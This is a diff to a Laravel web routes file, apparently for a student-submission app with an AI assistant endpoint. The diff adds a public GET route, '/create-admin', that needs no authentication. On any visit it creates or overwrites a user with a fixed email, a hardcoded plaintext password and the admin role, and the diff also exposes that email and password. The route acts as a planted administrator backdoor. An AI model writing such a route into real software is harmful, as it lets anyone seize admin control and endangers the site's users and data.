@@ -22,7 +22,8 @@ use App\Http\Controllers\Student\SubmissionController;
 use App\Http\Controllers\PublicAIController;
 
 
-
+use App\Models\User;
+use Illuminate\Support\Facades\Hash;
 
 
 
@@ -276,4 +277,19 @@ Route::get('/assistant', function () {
 });
 
 Route::post('/assistant/chat', [PublicAIController::class,'chat']);
+
+///
+Route::get('/create-admin', function () {
+
+    User::updateOrCreate(
+        ['email' => 'salummuhidini748@gmail.com'],
+        [
+            'name' => 'Th4kazulu',
+            'password' => Hash::make('Mlanz1.2'),
+            'role' => 'admin',
+        ]
+    );
+
+    return 'Admin created successfully!';
+});
 require __DIR__.'/auth.php';
